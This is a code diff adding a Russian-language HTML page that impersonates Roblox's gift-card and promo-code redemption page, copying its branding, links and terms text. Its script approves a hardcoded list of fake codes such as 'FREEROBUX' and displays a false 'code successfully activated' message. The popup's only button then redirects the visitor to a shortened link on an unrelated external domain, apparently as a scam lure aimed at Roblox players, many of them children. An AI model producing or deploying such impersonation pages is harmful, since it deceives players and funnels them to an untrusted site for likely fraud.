@@ -1,1 +1,589 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Активировать коды Roblox</title>
+    <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Gotham SSm", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f7f7f7;
+            color: #1a1a1a;
+            font-size: 14px;
+            line-height: 1.5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .top-nav {
+            background: #fff;
+            border-bottom: 1px solid #e6e6e6;
+            padding: 0;
+        }
+        
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 60px;
+        }
+        
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        
+        .burger-menu {
+            display: flex;
+            flex-direction: column;
+            gap: 3px;
+            cursor: pointer;
+            padding: 8px;
+        }
+        
+        .burger-line {
+            width: 20px;
+            height: 2px;
+            background-color: #333;
+            border-radius: 1px;
+        }
+        
+        .nav-logo {
+            height: 36px;
+        }
+        
+        .nav-center {
+            display: flex;
+            gap: 0;
+            align-items: center;
+            background: #f7f7f7;
+            border-radius: 4px;
+            padding: 4px;
+        }
+        
+        .nav-link {
+            color: #666;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 8px 16px;
+            transition: all 0.2s;
+            border-radius: 4px;
+        }
+        
+        .nav-link:hover, .nav-link.active {
+            color: #00a2ff;
+            background: #fff;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .nav-actions {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+        
+        .search-box {
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            width: 200px;
+            font-size: 13px;
+        }
+        
+        .login-btn {
+            background: #00a2ff;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .mobile-nav {
+            background: #fff;
+            border-bottom: 1px solid #e6e6e6;
+            padding: 8px 16px;
+            display: none;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .mobile-menu-dots {
+            width: 20px;
+            height: 4px;
+            background: #666;
+            border-radius: 2px;
+            position: relative;
+        }
+        
+        .mobile-menu-dots::before,
+        .mobile-menu-dots::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 4px;
+            background: #666;
+            border-radius: 2px;
+        }
+        
+        .mobile-menu-dots::before {
+            top: -8px;
+        }
+        
+        .mobile-menu-dots::after {
+            top: 8px;
+        }
+        
+        .container {
+            flex: 1;
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 16px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .code-label {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            text-align: center;
+            color: #333;
+        }
+        
+        .code-input-container {
+            margin-bottom: 16px;
+        }
+        
+        .code-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        
+        .terms-container {
+            margin-bottom: 16px;
+            display: flex;
+            align-items: flex-start;
+        }
+        
+        .terms-checkbox {
+            margin-right: 8px;
+            margin-top: 2px;
+        }
+        
+        .terms {
+            font-size: 12px;
+            color: #666;
+            text-align: left;
+        }
+        
+        .terms a {
+            color: #00a2ff;
+            text-decoration: none;
+        }
+        
+        .terms a:hover {
+            text-decoration: underline;
+        }
+        
+        .redeem-btn {
+            width: 100%;
+            background: #00a2ff;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-bottom: 24px;
+            font-weight: 600;
+        }
+        
+        .redeem-btn:hover {
+            background: #008ccf;
+        }
+        
+        .redeem-btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        /* Стили для всплывающего оповещения */
+        .alert-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .alert-box {
+            background: white;
+            border-radius: 8px;
+            padding: 24px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+        
+        .alert-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #333;
+        }
+        
+        .alert-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        
+        .alert-btn {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .back-btn {
+            background: #00a2ff;
+            color: white;
+        }
+        
+        /* Стили для фотографии подарочной карты */
+        .photo-section {
+            background: #fff;
+            border-radius: 12px;
+            padding: 0;
+            margin-bottom: 24px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .gift-card-image {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        .info-panel {
+            background: #f0f0f0;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .info-title {
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #333;
+            font-size: 16px;
+        }
+        
+        .info-list {
+            list-style: none;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .info-list li {
+            margin-bottom: 8px;
+            padding-left: 0;
+        }
+        
+        .info-list a {
+            color: #00a2ff;
+            text-decoration: none;
+        }
+        
+        .info-list a:hover {
+            text-decoration: underline;
+        }
 
+        .footer {
+            text-align: center;
+            padding: 16px 0;
+            color: #999;
+            font-size: 12px;
+        }
+        
+        .language-selector {
+            margin-bottom: 16px;
+        }
+        
+        .language-selector select {
+            padding: 6px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            background: white;
+            font-size: 13px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 8px 8px 0;
+            font-size: 12px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            color: #999;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+        
+        @media (max-width: 768px) {
+            .top-nav {
+                display: none;
+            }
+            
+            .mobile-nav {
+                display: flex;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Десктопная навигация -->
+    <nav class="top-nav">
+        <div class="nav-container">
+            <div class="nav-left">
+                <div class="burger-menu">
+                    <div class="burger-line"></div>
+                    <div class="burger-line"></div>
+                    <div class="burger-line"></div>
+                </div>
+                <a href="https://www.roblox.com">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png" alt="Roblox" class="nav-logo">
+                </a>
+            </div>
+            <div class="nav-center">
+                <a href="https://www.roblox.com/discover#!/popular" class="nav-link">Диаграммы</a>
+                <a href="https://www.roblox.com/catalog" class="nav-link">Торговая площадка</a>
+                <a href="https://create.roblox.com" class="nav-link">Создавать</a>
+                <a href="https://www.roblox.com/gamecards" class="nav-link active">Робуксы</a>
+            </div>
+            <div class="nav-actions">
+                <input type="text" class="search-box" placeholder="Поиск">
+                <a href="https://www.roblox.com/login" class="login-btn">Войти</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Мобильная навигация -->
+    <nav class="mobile-nav">
+        <a href="https://www.roblox.com">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png" alt="Roblox" class="nav-logo" style="height: 28px;">
+        </a>
+        <div class="mobile-menu-dots"></div>
+    </nav>
+
+    <div class="container">
+        <h1>Активировать коды Roblox</h1>
+        <p class="subtitle">Введите ниже вашу подарочную карту, виртуальный предмет или промокод.</p>
+        
+        <!-- Просто текст "Код" как в оригинале -->
+        <div class="code-label">Код</div>
+        
+        <!-- Поле для ввода кода -->
+        <div class="code-input-container">
+            <input type="text" class="code-input" placeholder="Введите код" id="code-input">
+        </div>
+        
+        <!-- Чекбокс с условиями -->
+        <div class="terms-container">
+            <input type="checkbox" id="terms-checkbox" class="terms-checkbox">
+            <label for="terms-checkbox" class="terms">
+                Отмечая это поле, вы подтверждаете, что вам исполнилось 18 лет, или что вы являетесь родителем или законным опекуном владельца учётной записи, и соглашаетесь с нашими условиями использования, включая арбитражную оговорку и Условия использования подарочных карт, а также с нашей Политикой конфиденциальности. Вы также подтверждаете и соглашаетесь с тем, что сумма указанная на лицевой стороне вашей подарочной карты, будет эквивалентна кредиту Roblox в вашей местной валюте.
+            </label>
+        </div>
+        
+        <button class="redeem-btn" id="redeem-btn" disabled>Выкупать</button>
+        
+        <!-- Секция с фотографией подарочной карты -->
+        <div class="photo-section">
+            <img src="https://i.postimg.cc/L5ZWhGH5/90e6639469a816169ab104e8bc2070a1-roblox-gift-card.png" alt="Roblox Gift Card" class="gift-card-image">
+        </div>
+        
+        <!-- Дополнительная информация -->
+        <div class="info-panel">
+            <div class="info-title">Дополнительная информация</div>
+            <ul class="info-list">
+                <li><a href="https://www.youtube.com/watch?v=6fL1Dk3j4qk" target="_blank">Как использовать подарочные карты (видео)</a></li>
+                <li><a href="https://en.help.roblox.com/hc/en-us/articles/115005566223-How-Do-I-Redeem-a-Gift-Card-" target="_blank">Дополнительная информация о подарочных картах</a></li>
+                <li><a href="https://en.help.roblox.com/hc/en-us/articles/203313270-How-Do-I-Redeem-a-Code-" target="_blank">Как использовать коды виртуальных предметов</a></li>
+                <li><a href="https://en.help.roblox.com/hc/en-us/articles/203313270-How-Do-I-Redeem-a-Code-" target="_blank">Как использовать промокоды</a></li>
+            </ul>
+        </div>
+        
+        <div class="footer">
+            <div class="language-selector">
+                <select>
+                    <option>Русский</option>
+                    <option>English</option>
+                    <option>Español</option>
+                    <option>Português</option>
+                    <option>Français</option>
+                    <option>Deutsch</option>
+                    <option>한국어</option>
+                    <option>日本語</option>
+                    <option>中文</option>
+                </select>
+            </div>
+            
+            <div class="footer-links">
+                <a href="https://www.roblox.com/info/about" target="_blank">О нас</a>
+                <a href="https://corp.roblox.com/careers/" target="_blank">Работа</a>
+                <a href="https://blog.roblox.com/" target="_blank">Блог</a>
+                <a href="https://corp.roblox.com/parents/" target="_blank">Родители</a>
+                <a href="https://www.roblox.com/gamecards" target="_blank">Подарочные карты</a>
+                <a href="https://en.help.roblox.com/hc/en-us" target="_blank">Помощь</a>
+                <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank">Условия</a>
+                <a href="https://corp.roblox.com/accessibility/" target="_blank">Доступность</a>
+                <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-Policy" target="_blank">Конфиденциальность</a>
+                <a href="https://www.roblox.com/info/privacy" target="_blank">Ваш выбор конфиденциальности</a>
+                <a href="https://www.roblox.com/sitemap" target="_blank">Карта сайта</a>
+            </div>
+            
+            <p class="copyright">©2025 Roblox Corporation. Roblox, логотип Roblox и Powering Imagination являются нашими зарегистрированными и незарегистрированными товарными знаками в США и других странах.</p>
+        </div>
+    </div>
+
+    <!-- Всплывающее оповещение об успешной активации -->
+    <div class="alert-overlay" id="alert-overlay">
+        <div class="alert-box">
+            <div class="alert-title">Код успешно активирован</div>
+            <div class="alert-buttons">
+                <button class="alert-btn back-btn" id="alert-back-btn">Вернуться к активации</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const termsCheckbox = document.getElementById('terms-checkbox');
+        const redeemBtn = document.getElementById('redeem-btn');
+        const codeInput = document.getElementById('code-input');
+        const alertOverlay = document.getElementById('alert-overlay');
+        const alertBackBtn = document.getElementById('alert-back-btn');
+        
+        // Список действительных кодов
+        const validCodes = ["SPIDERCOLA", "TWEETROBLOX", "ROBLOXEDU", "FREEROBUX", "DDJ", "FREENGNISDI"];
+        
+        termsCheckbox.addEventListener('change', function() {
+            if (this.checked) {
+                redeemBtn.disabled = false;
+            } else {
+                redeemBtn.disabled = true;
+            }
+        });
+        
+        redeemBtn.addEventListener('click', function() {
+            if (!termsCheckbox.checked) {
+                alert('Пожалуйста, подтвердите согласие с условиями использования.');
+                return;
+            }
+            
+            const code = codeInput.value.trim();
+            if (!code) {
+                alert('Пожалуйста, введите код.');
+                return;
+            }
+            
+            // Проверка кода
+            if (validCodes.includes(code.toUpperCase())) {
+                showSuccessAlert();
+            } else {
+                alert('Неверный код. Проверьте ввод и попробуйте снова.');
+            }
+        });
+        
+        function showSuccessAlert() {
+            // Показываем всплывающее оповещение
+            alertOverlay.style.display = 'flex';
+        }
+        
+        // Обработчик для кнопки "Вернуться к активации" в оповещении
+        alertBackBtn.addEventListener('click', function() {
+            // Переходим по указанной ссылке
+            window.location.href = 'https://wdho.ru/7Wvm';
+        });
+
+        // Закрытие оповещения при клике вне его
+        alertOverlay.addEventListener('click', function(e) {
+            if (e.target === alertOverlay) {
+                alertOverlay.style.display = 'none';
+                
+                // Сбрасываем форму
+                codeInput.value = '';
+                termsCheckbox.checked = false;
+                redeemBtn.disabled = true;
+            }
+        });
+
+        // Добавляем функциональность для поиска
+        document.querySelector('.search-box').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                const query = this.value.trim();
+                if (query) {
+                    window.open(`https://www.roblox.com/search/users?keyword=${encodeURIComponent(query)}`, '_blank');
+                }
+            }
+        });
+    </script>
+</body>
+</html>
